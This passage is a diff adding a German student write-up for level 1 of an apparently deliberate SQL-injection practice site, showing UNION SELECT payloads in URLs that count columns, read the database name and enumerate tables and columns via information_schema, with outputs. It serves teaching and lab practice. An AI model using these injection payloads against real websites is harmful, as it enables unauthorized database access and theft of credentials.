@@ -51,3 +51,34 @@ Da der Eingabetext potenziell immer ausführbaren SQL-Code enthalten könnte, so
 Dokumentieren Sie Ihr Vorgehen und ihre Lösung möglichst genau und nachvollziehbar.
 
 ### Dokumentation der Lösung
+
+Beim starten des ersten Levels wird im unteren Bereich der Fehler ` Fehler: Parameter 'id' ist nicht gesetzt. ` ausgegeben. Dies deuted darauf hin, dass in der URL der Parameter `id` fehlt. 
+
+Sobald man den Parameter in die URL einfügt, kommt der nächste Hinweis. Zahlen von 1-3 ergeben verschiedene Usernamen
+>`http://hackit.gehaxelt.in/sqli/level1.php?id=1`
+
+* (1) Der Username lautet: adminer 
+* (2) Der Username lautet: rooter 
+* (3) Der Username lautet: test 
+
+Über einen UNION SELECT wird dann probiert herauszufinden wieviele Spalten die Tabelle hat, aus welcher die Benutzer gelesen werden. Für dies musste die Spaltenanzahl stetig erhöht werden und die AND Bedingung muss falsch sein (in diesem fall 1=5 was false ist). Dann 
+
+`http://hackit.gehaxelt.in/sqli/level1.php?id=1 AND 1=5 UNION SELECT 1,2,3,4,5`
+
+>  Der Username lautet: 2 
+
+Jetzt weiss man dass die Spaltenanzahl 5 ist und dass man beim UNION SELECT die 2 durch andere Funktionen ersetzen kann, um dann mehr Infos zu erhalten, welche dann ausgegeben werden. Ziel wäre es jetzt, an den Tabellennamen von den Benutzern zu kommen, um das Passwort auslesen zu können. Um an das Schema heranzukommen, benötigen wir den Namen der DB, dazu versuchen wir folgendes:
+
+`http://hackit.gehaxelt.in/sqli/level1.php?id=1 AND 1=5 UNION SELECT 1,database(),3,4,5`
+
+>  Der Username lautet: level_1_jkjashd 
+
+Den Datenbanknamen haben wir jetzt, dann kann das Schema ausgelesen werden:
+
+`http://hackit.gehaxelt.in/sqli/level1.php?id=1 AND 1=5 UNION SELECT 1,table_name,3,4,5 from information_schema.tables where table_schema='level_1_jkjashd'`
+
+> Der Username lautet: user 
+
+Jetzt muss die Column herausgefunden werden:
+
+`http://hackit.gehaxelt.in/sqli/level1.php?id=1 AND 1=5 UNION SELECT 1,column_name,3,4,5 from information_schema.columns where table_schema='level_1_jkjashd' and table_name='user' LIMIT 0,1--`
